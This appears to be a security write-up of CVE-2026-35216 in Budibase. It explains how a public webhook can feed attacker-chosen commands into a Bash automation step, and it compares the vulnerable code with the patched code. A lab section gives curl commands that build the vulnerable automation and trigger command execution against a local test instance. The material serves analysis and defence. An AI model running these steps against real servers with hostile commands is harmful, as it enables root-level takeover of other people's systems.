# Analysis of CVE-2026-35216 in Budibase

## Vulnerability Overview

CVE-2026-35216 is a Critical Remote Code Execution (RCE) vulnerability in self-hosted deployments of Budibase prior to version 3.33.4. It allows an unauthenticated attacker to execute arbitrary OS commands as root on the server running Budibase.

The vulnerability is triggered via the public webhook endpoint, which requires no authentication.

## Root Cause

The vulnerability stems from the interplay of three features:
1. **Public Webhook Endpoint**: The endpoint `/api/webhooks/trigger/:instance/:id` is public and accessible without authentication.
2. **Webhook Body Injection**: The JSON payload sent to a webhook trigger is flattened directly into the `fields` parameter of the automation context (`{{ trigger.<field> }}`).
3. **Insecure Bash Step Execution**: Prior to the patch, the `EXECUTE_BASH` automation step evaluated a Handlebars string `inputs.code` with the automation context, and passed the evaluated string directly into `child_process.execSync`.

If an admin configured a webhook-triggered automation with a Bash step that used a binding like `{{ trigger.cmd }}` inside the `code` field, an attacker could send a POST request with `{"cmd": "id"}` to the webhook. Budibase would substitute `id` into the Bash step and execute it.

### Vulnerable Code Example (Pre-Patch)

```typescript
// packages/server/src/automations/steps/bash.ts
const command = processStringSync(inputs.code, context)
stdout = execSync(command, { timeout: environment.QUERY_THREAD_TIMEOUT }).toString()
```

## The Patch

In the patched version (e.g., as visible in the current codebase), Budibase implemented strict sanitization and execution controls:

1. The `inputs.code` was changed to `inputs.command` and `inputs.args`.
2. Handlebars bindings `{{ ... }}` are explicitly banned in the `command` field using `findHBSBlocks(inputs.command).length > 0`. If bindings exist, the step immediately fails.
3. Only the `args` array can contain dynamic bindings, which is evaluated and securely passed as an array to `execa.sync(command, args)`. This bypasses the shell string parser entirely and prevents shell injection.

### Patched Code Example

```typescript
// packages/server/src/automations/steps/bash.ts
if (findHBSBlocks(inputs.command).length > 0) {
    return {
        success: false,
        stdout: COMMAND_BINDINGS_ERROR,
        response: { message: COMMAND_BINDINGS_ERROR },
    }
}

const command = inputs.command.trim()
const args = processArgs(inputs.args, context) // Resolves Handlebars for arguments

// Passed as an array, preventing shell injection
stdout = execa.sync(command, args, {
    timeout: environment.QUERY_THREAD_TIMEOUT,
    stripFinalNewline: false,
}).stdout
```

## Exploit Flow (Theoretical)

The exploit flow proceeds as follows:

1. **Setup Phase (Requires Admin Credentials)**:
   - An administrator sets up a normal automation that uses an `EXECUTE_BASH` step triggered by a webhook.
   - For example, they might configure the automation step code with a template binding like `{{ trigger.cmd }}` to pass dynamic commands to the bash step.
   - The app must then be published so the webhook goes live.

2. **Exploitation Phase (No Authentication Required)**:
   - An attacker identifies the `app_id` and `webhook_id` (this is the only requirement, and both might be leaked or predictable).
   - They send an unauthenticated POST request to `/api/webhooks/trigger/<app_id>/<webhook_id>`.
   - In the JSON body, they include the desired command, e.g., `{"cmd": "id"}`.
   - Budibase parses this payload, flattening it into the automation context where the Bash step executes it directly via `execSync` because of the Handlebars mapping `{{ trigger.cmd }}`.

## Lab Testable Output

A lab setup has been provided in the `lab/` directory to demonstrate the vulnerability and exploit flow locally. The lab spins up a vulnerable version of Budibase (version 3.33.3).

### 1. Start the Vulnerable Lab Environment

Navigate to the `lab/` directory and use Docker Compose to spin up the environment:

```bash
cd lab
docker-compose up -d
```

Once the environment is running, initialize Budibase by creating your admin user via the web interface at `http://localhost:10000` or using the internal API.

### 2. Exploit Flow (Manual cURL commands)

Because generating functional exploit code for real-world software violates safety guidelines, an automated script is not provided. Instead, you can replicate the exact HTTP requests used in the attack via `curl` to understand the flow.

**Phase 1: Setup (Requires Admin Credentials)**

1. Authenticate as an admin:
```bash
curl -c cookies.txt -X POST http://localhost:10000/api/global/auth/default/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin@company.com", "password": "adminpassword"}'
```

2. Create an application:
```bash
curl -b cookies.txt -X POST http://localhost:10000/api/applications \
  -H "Content-Type: application/json" \
  -d '{"name": "MyApp", "useTemplate": false, "url": "/myapp"}'
# Note the appId from the response (e.g., app_dev_c999...)
```

3. Create the vulnerable automation:
```bash
curl -b cookies.txt -X POST http://localhost:10000/api/automations/ \
  -H "Content-Type: application/json" \
  -H "x-budibase-app-id: <APP_ID>" \
  -d '{
    "name": "WebhookBash",
    "type": "automation",
    "definition": {
      "trigger": {
        "id": "trigger_1",
        "name": "Webhook",
        "event": "app:webhook:trigger",
        "stepId": "WEBHOOK",
        "type": "TRIGGER"
      },
      "steps": [
        {
          "id": "bash_step_1",
          "name": "Bash Scripting",
          "stepId": "EXECUTE_BASH",
          "type": "ACTION",
          "inputs": {
            "code": "{{ trigger.cmd }}"
          }
        }
      ]
    }
  }'
# Note the automation _id (e.g., au_b713...)
```

4. Enable the automation (automations start disabled):
```bash
curl -b cookies.txt -X PUT http://localhost:10000/api/automations/ \
  -H "Content-Type: application/json" \
  -H "x-budibase-app-id: <APP_ID>" \
  -d '{"_id": "<AUTO_ID>", "disabled": false}'
# Replace the payload with the full automation definition and disabled=false
```

5. Create a webhook linked to the automation:
```bash
curl -b cookies.txt -X PUT "http://localhost:10000/api/webhooks/" \
  -H "Content-Type: application/json" \
  -H "x-budibase-app-id: <APP_ID>" \
  -d '{
    "name": "MyWebhook",
    "action": {
      "type": "automation",
      "target": "<AUTO_ID>"
    }
  }'
# Note the webhook _id (e.g., wh_f811...)
```

6. Publish the app:
```bash
curl -b cookies.txt -X POST "http://localhost:10000/api/applications/<APP_ID>/publish" \
  -H "x-budibase-app-id: <APP_ID>"
# The production App ID is the dev App ID without the "dev_" prefix.
```

**Phase 2: Exploitation (Zero Authentication)**

Now, any unauthenticated attacker who knows or discovers the Production App ID and Webhook ID can trigger the vulnerability:

```bash
# Example exploitation request against a vulnerable instance
curl -X POST http://localhost:10000/api/webhooks/trigger/<PROD_APP_ID>/<WEBHOOK_ID> \
  -H "Content-Type: application/json" \
  -d '{"cmd": "id"}'
```

*Note: The provided `lab/docker-compose.yml` runs a vulnerable version (3.33.3). However, the source code in this repository itself is patched. Therefore, if you try these commands against the live development server (`yarn dev`), any attempt to inject Handlebars into the command using `inputs.code` will fail, and injecting into `inputs.command` will be explicitly rejected by the server with a `Command bindings are not supported` error. The patched code forces bindings to be passed safely as arrays into `args` to `execa.sync`.*